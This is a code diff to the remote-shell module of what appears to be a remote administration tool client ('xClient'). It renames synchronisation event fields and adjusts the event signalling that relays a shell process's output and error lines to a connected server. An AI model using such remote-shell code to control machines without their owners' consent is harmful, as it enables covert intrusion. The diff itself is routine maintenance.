@@ -14,9 +14,9 @@ namespace xClient.Core.RemoteShell
         // error output stream from the shell (after we are done reading the standard
         // output). Reading the standard output and the standard error output at the
         // same time will cause a deadlock.
-        private ManualResetEvent redirectOutputEvent;
+        private ManualResetEvent _redirectOutputEvent;
 
-        private ManualResetEvent redirectStandardErrorEvent;
+        private ManualResetEvent _redirectStandardErrorEvent;
 
         private void CreateSession()
         {
@@ -51,15 +51,15 @@ namespace xClient.Core.RemoteShell
         /// </summary>
         private void InitializeResetEvents()
         {
-            if (redirectOutputEvent != null)
-                redirectOutputEvent.Close();
+            if (_redirectOutputEvent != null)
+                _redirectOutputEvent.Close();
             
-            redirectOutputEvent = new ManualResetEvent(false);
+            _redirectOutputEvent = new ManualResetEvent(false);
 
-            if (redirectStandardErrorEvent != null)
-                redirectStandardErrorEvent.Close();
+            if (_redirectStandardErrorEvent != null)
+                _redirectStandardErrorEvent.Close();
 
-            redirectStandardErrorEvent = new ManualResetEvent(true);
+            _redirectStandardErrorEvent = new ManualResetEvent(true);
         }
 
         private void RedirectOutputs()
@@ -78,13 +78,13 @@ namespace xClient.Core.RemoteShell
                 {
                     while (!reader.EndOfStream && _read)
                     {
-                        if (redirectStandardErrorEvent == null)
+                        if (_redirectStandardErrorEvent == null)
                             // Break out completely if the second part of our chain won't work...
                             return;
 
                         // If we are reading the standard error output, just wait.
-                        redirectStandardErrorEvent.WaitOne();
-                        redirectOutputEvent.Set();
+                        _redirectStandardErrorEvent.WaitOne();
+                        _redirectOutputEvent.Set();
 
                         var read = reader.ReadLine();
                         if (!string.IsNullOrEmpty(read))
@@ -94,14 +94,14 @@ namespace xClient.Core.RemoteShell
                                 Program.ConnectClient);
                         }
 
-                        redirectOutputEvent.Reset();
+                        _redirectOutputEvent.Reset();
                     }
                 }
 
                 if ((_prc == null || _prc.HasExited) && _read)
                     throw new ApplicationException("session unexpectedly closed");
             }
-            catch (ObjectDisposedException ex)
+            catch (ObjectDisposedException)
             {
                 // just exit
             }
@@ -126,12 +126,12 @@ namespace xClient.Core.RemoteShell
                     while (!reader.EndOfStream && _read)
                     {
                         // Wait for your turn! ;)
-                        if (redirectOutputEvent == null)
+                        if (_redirectOutputEvent == null)
                             // Break out completely if the first part of our chain doesn't work...
                             return;
 
-                        redirectOutputEvent.WaitOne();
-                        redirectStandardErrorEvent.Reset();
+                        _redirectOutputEvent.WaitOne();
+                        _redirectStandardErrorEvent.Set();
 
                         var read = reader.ReadLine();
                         if (!string.IsNullOrEmpty(read))
@@ -141,7 +141,7 @@ namespace xClient.Core.RemoteShell
                                 Program.ConnectClient);
                         }
 
-                        redirectStandardErrorEvent.Set();
+                        _redirectStandardErrorEvent.Reset();
                     }
                 }
 
@@ -216,13 +216,13 @@ namespace xClient.Core.RemoteShell
                 { }
                 finally
                 {
-                    if (redirectOutputEvent != null)
+                    if (_redirectOutputEvent != null)
                     {
-                        redirectOutputEvent.Close();
+                        _redirectOutputEvent.Close();
                     }
-                    if (redirectStandardErrorEvent != null)
+                    if (_redirectStandardErrorEvent != null)
                     {
-                        redirectStandardErrorEvent.Close();
+                        _redirectStandardErrorEvent.Close();
                     }
                 }
             }
